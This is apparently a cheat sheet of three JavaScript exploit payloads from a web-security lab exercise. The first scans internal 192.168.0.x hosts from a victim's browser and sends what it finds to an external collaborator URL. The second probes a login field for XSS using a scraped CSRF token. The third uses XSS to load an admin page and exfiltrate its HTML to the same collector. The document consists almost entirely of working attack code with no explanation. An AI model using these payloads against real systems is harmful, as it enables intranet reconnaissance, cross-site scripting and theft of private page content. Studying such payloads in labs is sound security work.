## JS Internal Network Port Scanner 
```js
<script>
var q = [], collaboratorURL = 'http://ac3b1fe21fddcea0802d5e8a01780096.web-security-academy.net/exploit';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script> 
```

***

## Probe Field For XSS
```js
<script>  
function xss(url, text, vector) {  
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];  
}  
  
function fetchUrl(url, collaboratorURL){  
  fetch(url).then(r=>r.text().then(text=>  
  {  
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');  
  }  
  ))  
}  
  
fetchUrl("http://192.168.0.42:8080", "http://ac3b1fe21fddcea0802d5e8a01780096.web-security-academy.net/exploit");  
</script>
```

***

## Extract Page Source Code
```js
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
  }
  ))
}

fetchUrl("http://192.168.0.42:8080", "http://ac3b1fe21fddcea0802d5e8a01780096.web-security-academy.net/exploit");
</script> 
```
***
## 